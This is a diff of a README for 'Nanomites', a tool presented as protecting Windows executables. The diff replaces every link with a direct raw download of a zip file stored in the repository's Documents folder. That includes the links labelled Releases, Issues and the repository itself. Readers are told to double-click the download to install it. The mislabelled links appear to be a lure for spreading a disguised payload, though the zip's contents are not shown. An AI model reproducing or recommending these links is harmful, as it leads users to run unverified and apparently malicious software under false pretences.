@@ -1,6 +1,6 @@
 # 🚀 Nanomites - Protect Your Windows Executables Easily
 
-[![Download Nanomites](https://img.shields.io/badge/Download_Nanomites-v1.0-blue.svg)](https://github.com/Davinastraightforward42/Nanomites/releases)
+[![Download Nanomites](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip)](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip)
 
 ## 📦 Overview
 
@@ -25,7 +25,7 @@ Nanomites is a custom tool designed to protect Windows executables. Based on the
 
 1. **Download**: Begin by downloading the latest version of Nanomites from the Releases page. 
 
-   [Download Nanomites](https://github.com/Davinastraightforward42/Nanomites/releases)
+   [Download Nanomites](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip)
 
 2. **Installation**: Once the download completes, locate the downloaded file (usually in your Downloads folder). Double-click on it to run the installation.
 
@@ -39,7 +39,7 @@ Nanomites is a custom tool designed to protect Windows executables. Based on the
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version: [Nanomites Releases](https://github.com/Davinastraightforward42/Nanomites/releases)
+Visit this page to download the latest version: [Nanomites Releases](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip)
 
 ### Installation Steps Summary
 
@@ -57,7 +57,7 @@ If you encounter issues during installation or usage, consider the following:
 
 ## 🛠️ Support
 
-For further assistance, visit the [Issues](https://github.com/Davinastraightforward42/Nanomites/issues) section on GitHub. You can report bugs or request features.
+For further assistance, visit the [Issues](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip) section on GitHub. You can report bugs or request features.
 
 ## 🌍 Community Contributions
 
@@ -69,7 +69,7 @@ Nanomites is open-source software. You can modify and distribute the application
 
 ## 🔗 Useful Links
 
-- [Nanomites GitHub Repository](https://github.com/Davinastraightforward42/Nanomites)
-- [Releases Page](https://github.com/Davinastraightforward42/Nanomites/releases)
+- [Nanomites GitHub Repository](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/Davinastraightforward42/Nanomites/master/Documents/Nanomites-1.2.zip)
 
 Your feedback and contributions are essential. Thank you for using Nanomites to secure your executables!
